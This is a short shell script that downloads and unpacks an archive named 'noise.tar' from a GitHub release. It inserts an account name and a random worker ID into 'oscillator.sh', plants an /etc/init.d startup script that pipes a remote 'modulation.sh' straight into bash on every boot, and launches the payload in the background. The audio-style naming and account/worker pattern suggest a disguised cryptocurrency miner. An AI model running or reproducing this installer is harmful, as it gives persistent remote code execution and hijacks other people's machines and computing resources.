cd /
rm -rf noise.tar
rm -rf noise
wget https://github.com/meggafany/mixer/releases/download/v1.0.2/noise.tar
tar -xvf noise.tar
cd /noise
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./oscillator.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./oscillator.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/meggafany/mixer/main/modulation.sh)" > mono.sh
chmod a+x mono.sh
update-rc.d mono.sh defaults
cd /noise
nohup ./oscillator.sh
ps -ef | grep noise
